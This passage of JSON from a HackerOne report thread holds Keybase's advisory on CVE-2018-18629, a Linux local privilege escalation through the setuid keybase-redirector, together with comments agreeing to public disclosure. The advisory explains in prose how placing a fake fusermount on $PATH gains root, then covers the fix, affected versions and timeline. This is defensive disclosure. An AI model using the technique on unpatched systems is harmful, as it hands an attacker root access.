binary.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2018-12-18T02:19:09.566Z","updated_at":"2018-12-18T02:19:09.566Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3849862,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here's our advisory that we intend to publish (with some small data modifications). I asked around, a blog post will be fine, thanks for asking, we appreciate it.\n\n```md\n\n## Local Privilege Escalation on Linux via keybase-redirector (KB002)\n\n### Publication Date\n\n2018 Dec 20\n\n### Externals Links\n\n* [HackerOne Report from michr](https://hackerone.com/reports/426944)\n* [MITRE CVE-2018-18629](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18629)\n\n### Description\n\nThe Keybase\n[file system redirector](https://github.com/keybase/kbfs/tree/master/redirector)\ncontrols the `/keybase` mountpoint on Linux machines (and macOS\nmachines that have enabled Finder integration).  In order to support\nmultiple users running Keybase on the same machine, both able to\naccess the Keybase file system through `/keybase` paths, this\nmountpoint acts as a redirector, using FUSE to present symlinks to\nuser, redirecting them to their personal Keybase file system\nmountpoint (usually located at `/run/user/UID/keybase/kbfs` on Linux,\nthough it varies by OS distribution and local configuration).  The\nbinary that creates this mountpoint is called `keybase-redirector`,\nand the Keybase package installer sets its suid bit so that it can\nhave root permissions, which are necessary to create the `/keybase`\nmountpoint and to mount a FUSE file system that can be accessed by\nmultiple users.  It is executable by any user, since users run\nKeybase under their own accounts.\n\nThe attack was possible due to a previous version of\n`keybase-redirector` that used the `fusermount` binary to create the\n`/keybase` mountpoint.  It did this indirectly through a call to the\n`Mount()` function in the Go library\n[bazil.org/fuse](https://github.com/bazil/fuse) (forked for Keybase\n[here](https://github.com/keybase/fuse)), after obtaining root\nprivileges.  That function used Go's\n[exec.Command](https://golang.org/pkg/os/exec/#Command) function to\nexecute a call to `fusermount`.  However, it did not specify an\nabsolute path or clear the environment when doing so.  Because of\nthis, malicious software running on the user's computer could make any\nexecutable named `fusermount`, set their `$PATH` environment variable\nto include the directory containing that executable, and call\n`keybase-redirector`, tricking it into running that executable with\nroot permissions.\n\nNote that macOS was not vulnerable to this bug, because\n`keybase-redirector` does not have the suid bit set on that platform.\nIt is only run by root via the Keybase helper.\n\nThis attack was discovered by HackerOne researcher Rich Mirch\n([mirchr](https://hackerone.com/mirchr)) on 2018 Oct 22. We are deeply\nthankful to Rich for doing such good research and for sharing his findings in\nsuch a timely and responsible manner.\n\n### The Fix\n\nThe immediate fix was a change to\n[restrict the PATH used by keybase-redirector](https://github.com/keybase/kbfs/commit/eef09fd5d71579fef03a7c9ac30a40d6aed7aff2).\nLater, we further hardened the redirector by\n[directly using the `Mount` syscall instead of a separate binary](https://github.com/keybase/fuse/commit/a8447a81d2b76962a5a3e54f4f374f20c2a39bfb)\nwhen running as root, and\n[minimizing the time we use root privileges](https://github.com/keybase/kbfs/commit/bd408b5d80a7b38152e3bd9138393bc61333b4e6).\nThe result is that `keybase-redirector` no longer executes other\nbinaries, and only uses root permissions while performing the `Mount`\nsyscall.  It reverts to user permissions while serving FUSE requests\nfor users of the `/keybase` mountpoint.\n\nWe released the initial fix in late October 2018\n(2.8.0-20181023124437), and the further-hardened version in November\n2018 (2.10.0-20181112152732).\n\n### Affected Versions\n\nKeybase versions release on or after March 1, 2018\n([commit 06b97bb3](https://github.com/keybase/kbfs/pull/1496/commits/06b97bb3f32542c02f788d259ccf3705bda8dac8)),\nand prior to 2.8.0-20181023124437.\n\n### Remediation\n\nUpgrade to 2.8.0-20181023124437 or above.  All package repos received\nan upgraded package shortly after the bug was discovered.\n\nIt is also possible to disable the file system redirector if it's not\nwanted.  See the instructions\n[here](https://keybase.io/docs/kbfs/understanding_kbfs) under \"Root\nredirector\".\n\n### Timeline\n\n* 2018 Oct 22 — Vulnerability reported to HackerOne\n* 2018 Oct 22 — Fix commited to master\n* 2018 Oct 23 — New Linux release (2.8.0-20181023124437) pushed out to distribution package repositories for Ubuntu, Red Hat, and Arch\n* 2018 Nov 11 — Subsequent release with further hardening ((2.10.0-20181112152732)\n* 2018 Dec 3 — E-mails sent out to all users still running affected versions, asking for users to upgrade\n* 2018 Dec 4 — In-app warnings sent out to all old applications, asking for users to ugprade\n* 2018 Dec 6 — In-app message from [max](https://keybase.io/max) asking for users to upgrade\n* 2018 Dec 11 — Affected versions bricked via server switch\n* 2018 Dec 20 — This announcement\n```\n","markdown_message":"\u003cp\u003eHere\u0026#39;s our advisory that we intend to publish (with some small data modifications). I asked around, a blog post will be fine, thanks for asking, we appreciate it.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight markdown\"\u003e\u003ccode\u003e\n\u003cspan class=\"gu\"\u003e## Local Privilege Escalation on Linux via keybase-redirector (KB002)\u003c/span\u003e\n\n\u003cspan class=\"gu\"\u003e### Publication Date\u003c/span\u003e\n\n2018 Dec 20\n\n\u003cspan class=\"gu\"\u003e### Externals Links\u003c/span\u003e\n\u003cspan class=\"p\"\u003e\n*\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003eHackerOne Report from michr\u003c/span\u003e\u003cspan class=\"p\"\u003e](\u003c/span\u003e\u003cspan class=\"sx\"\u003ehttps://hackerone.com/reports/426944\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e*\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003eMITRE CVE-2018-18629\u003c/span\u003e\u003cspan class=\"p\"\u003e](\u003c/span\u003e\u003cspan class=\"sx\"\u003ehttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18629\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"gu\"\u003e### Description\u003c/span\u003e\n\nThe Keybase\n\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003efile system redirector\u003c/span\u003e\u003cspan class=\"p\"\u003e](\u003c/span\u003e\u003cspan class=\"sx\"\u003ehttps://github.com/keybase/kbfs/tree/master/redirector\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\ncontrols the \u003cspan class=\"sb\"\u003e`/keybase`\u003c/span\u003e mountpoint on Linux machines (and macOS\nmachines that have enabled Finder integration).  In order to support\nmultiple users running Keybase on the same machine, both able to\naccess the Keybase file system through \u003cspan class=\"sb\"\u003e`/keybase`\u003c/span\u003e paths, this\nmountpoint acts as a redirector, using FUSE to present symlinks to\nuser, redirecting them to their personal Keybase file system\nmountpoint (usually located at \u003cspan class=\"sb\"\u003e`/run/user/UID/keybase/kbfs`\u003c/span\u003e on Linux,\nthough it varies by OS distribution and local configuration).  The\nbinary that creates this mountpoint is called \u003cspan class=\"sb\"\u003e`keybase-redirector`\u003c/span\u003e,\nand the Keybase package installer sets its suid bit so that it can\nhave root permissions, which are necessary to create the \u003cspan class=\"sb\"\u003e`/keybase`\u003c/span\u003e\nmountpoint and to mount a FUSE file system that can be accessed by\nmultiple users.  It is executable by any user, since users run\nKeybase under their own accounts.\n\nThe attack was possible due to a previous version of\n\u003cspan class=\"sb\"\u003e`keybase-redirector`\u003c/span\u003e that used the \u003cspan class=\"sb\"\u003e`fusermount`\u003c/span\u003e binary to create the\n\u003cspan class=\"sb\"\u003e`/keybase`\u003c/span\u003e mountpoint.  It did this indirectly through a call to the\n\u003cspan class=\"sb\"\u003e`Mount()`\u003c/span\u003e function in the Go library\n\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003ebazil.org/fuse\u003c/span\u003e\u003cspan class=\"p\"\u003e](\u003c/span\u003e\u003cspan class=\"sx\"\u003ehttps://github.com/bazil/fuse\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sx\"\u003eforked\u003c/span\u003e for Keybase\n\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003ehere\u003c/span\u003e\u003cspan class=\"p\"\u003e](\u003c/span\u003e\u003cspan class=\"sx\"\u003ehttps://github.com/keybase/fuse\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e), after obtaining root\nprivileges.  That function used Go\u0026#39;s\n\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003eexec.Command\u003c/span\u003e\u003cspan class=\"p\"\u003e](\u003c/span\u003e\u003cspan class=\"sx\"\u003ehttps://golang.org/pkg/os/exec/#Command\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e function to\nexecute a call to \u003cspan class=\"sb\"\u003e`fusermount`\u003c/span\u003e.  However, it did not specify an\nabsolute path or clear the environment when doing so.  Because of\nthis, malicious software running on the user\u0026#39;s computer could make any\nexecutable named \u003cspan class=\"sb\"\u003e`fusermount`\u003c/span\u003e, set their \u003cspan class=\"sb\"\u003e`$PATH`\u003c/span\u003e environment variable\nto include the directory containing that executable, and call\n\u003cspan class=\"sb\"\u003e`keybase-redirector`\u003c/span\u003e, tricking it into running that executable with\nroot permissions.\n\nNote that macOS was not vulnerable to this bug, because\n\u003cspan class=\"sb\"\u003e`keybase-redirector`\u003c/span\u003e does not have the suid bit set on that platform.\nIt is only run by root via the Keybase helper.\n\nThis attack was discovered by HackerOne researcher Rich Mirch\n(\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003emirchr\u003c/span\u003e\u003cspan class=\"p\"\u003e](\u003c/span\u003e\u003cspan class=\"sx\"\u003ehttps://hackerone.com/mirchr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e) on 2018 Oct 22. We are deeply\nthankful to Rich for doing such good research and for sharing his findings in\nsuch a timely and responsible manner.\n\n\u003cspan class=\"gu\"\u003e### The Fix\u003c/span\u003e\n\nThe immediate fix was a change to\n\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003erestrict the PATH used by keybase-redirector\u003c/span\u003e\u003cspan class=\"p\"\u003e](\u003c/span\u003e\u003cspan class=\"sx\"\u003ehttps://github.com/keybase/kbfs/commit/eef09fd5d71579fef03a7c9ac30a40d6aed7aff2\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e.\nLater, we further hardened the redirector by\n\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003edirectly using the `Mount` syscall instead of a separate binary\u003c/span\u003e\u003cspan class=\"p\"\u003e](\u003c/span\u003e\u003cspan class=\"sx\"\u003ehttps://github.com/keybase/fuse/commit/a8447a81d2b76962a5a3e54f4f374f20c2a39bfb\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\nwhen running as root, and\n\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003eminimizing the time we use root privileges\u003c/span\u003e\u003cspan class=\"p\"\u003e](\u003c/span\u003e\u003cspan class=\"sx\"\u003ehttps://github.com/keybase/kbfs/commit/bd408b5d80a7b38152e3bd9138393bc61333b4e6\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e.\nThe result is that \u003cspan class=\"sb\"\u003e`keybase-redirector`\u003c/span\u003e no longer executes other\nbinaries, and only uses root permissions while performing the \u003cspan class=\"sb\"\u003e`Mount`\u003c/span\u003e\nsyscall.  It reverts to user permissions while serving FUSE requests\nfor users of the \u003cspan class=\"sb\"\u003e`/keybase`\u003c/span\u003e mountpoint.\n\nWe released the initial fix in late October 2018\n(2.8.0-20181023124437), and the further-hardened version in November\n2018 (2.10.0-20181112152732).\n\n\u003cspan class=\"gu\"\u003e### Affected Versions\u003c/span\u003e\n\nKeybase versions release on or after March 1, 2018\n(\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003ecommit 06b97bb3\u003c/span\u003e\u003cspan class=\"p\"\u003e](\u003c/span\u003e\u003cspan class=\"sx\"\u003ehttps://github.com/keybase/kbfs/pull/1496/commits/06b97bb3f32542c02f788d259ccf3705bda8dac8\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e),\nand prior to 2.8.0-20181023124437.\n\n\u003cspan class=\"gu\"\u003e### Remediation\u003c/span\u003e\n\nUpgrade to 2.8.0-20181023124437 or above.  All package repos received\nan upgraded package shortly after the bug was discovered.\n\nIt is also possible to disable the file system redirector if it\u0026#39;s not\nwanted.  See the instructions\n\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003ehere\u003c/span\u003e\u003cspan class=\"p\"\u003e](\u003c/span\u003e\u003cspan class=\"sx\"\u003ehttps://keybase.io/docs/kbfs/understanding_kbfs\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e under \u0026quot;Root\nredirector\u0026quot;.\n\n\u003cspan class=\"gu\"\u003e### Timeline\u003c/span\u003e\n\u003cspan class=\"p\"\u003e\n*\u003c/span\u003e 2018 Oct 22 — Vulnerability reported to HackerOne\n\u003cspan class=\"p\"\u003e*\u003c/span\u003e 2018 Oct 22 — Fix commited to master\n\u003cspan class=\"p\"\u003e*\u003c/span\u003e 2018 Oct 23 — New Linux release (2.8.0-20181023124437) pushed out to distribution package repositories for Ubuntu, Red Hat, and Arch\n\u003cspan class=\"p\"\u003e*\u003c/span\u003e 2018 Nov 11 — Subsequent release with further hardening ((2.10.0-20181112152732)\n\u003cspan class=\"p\"\u003e*\u003c/span\u003e 2018 Dec 3 — E-mails sent out to all users still running affected versions, asking for users to upgrade\n\u003cspan class=\"p\"\u003e*\u003c/span\u003e 2018 Dec 4 — In-app warnings sent out to all old applications, asking for users to ugprade\n\u003cspan class=\"p\"\u003e*\u003c/span\u003e 2018 Dec 6 — In-app message from \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003emax\u003c/span\u003e\u003cspan class=\"p\"\u003e](\u003c/span\u003e\u003cspan class=\"sx\"\u003ehttps://keybase.io/max\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e asking for users to upgrade\n\u003cspan class=\"p\"\u003e*\u003c/span\u003e 2018 Dec 11 — Affected versions bricked via server switch\n\u003cspan class=\"p\"\u003e*\u003c/span\u003e 2018 Dec 20 — This announcement\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2018-12-18T02:26:47.998Z","updated_at":"2018-12-18T02:26:47.998Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3849890,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Excellent advisory @maxtaco!  It's been a pleasure working with you.","markdown_message":"\u003cp\u003eExcellent advisory \u003ca href=\"/maxtaco\"\u003e@maxtaco\u003c/a\u003e!  It\u0026#39;s been a pleasure working with you.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-18T02:39:06.340Z","updated_at":"2018-12-18T02:39:06.340Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3863369,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"OK, we're ready to disclose, here is a link to our security advisory: https://keybase.io/docs/secadv/kb002","markdown_message":"\u003cp\u003eOK, we\u0026#39;re ready to disclose, here is a link to our security advisory: \u003ca title=\"https://keybase.io/docs/secadv/kb002\" href=\"/redirect?url=https%3A%2F%2Fkeybase.io%2Fdocs%2Fsecadv%2Fkb002\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://keybase.io/docs/secadv/kb002\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-18T19:35:12.405Z","updated_at":"2018-12-18T19:35:12.405Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3863386,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thank you @mirchr and thank you for the great work. I'm happy to disclose this report here too if it suits you.","markdown_message":"\u003cp\u003eThank you \u003ca href=\"/mirchr\"\u003e@mirchr\u003c/a\u003e and thank you for the great work. I\u0026#39;m happy to disclose this report here too if it suits you.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-18T19:38:03.338Z","updated_at":"2018-12-18T19:38:03.338Z","first_to_agree":true,"actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3863524,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Ok with the disclosure @maxtaco. Thanks!","markdown_message":"\u003cp\u003eOk with the disclosure \u003ca href=\"/maxtaco\"\u003e@maxtaco\u003c/a\u003e. Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-18T20:11:53.315Z","updated_at":"2018-12-18T20:11:53.315Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3863525,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-12-18T20:11:53.387Z","updated_at":"2018-12-18T20:11:53.387Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}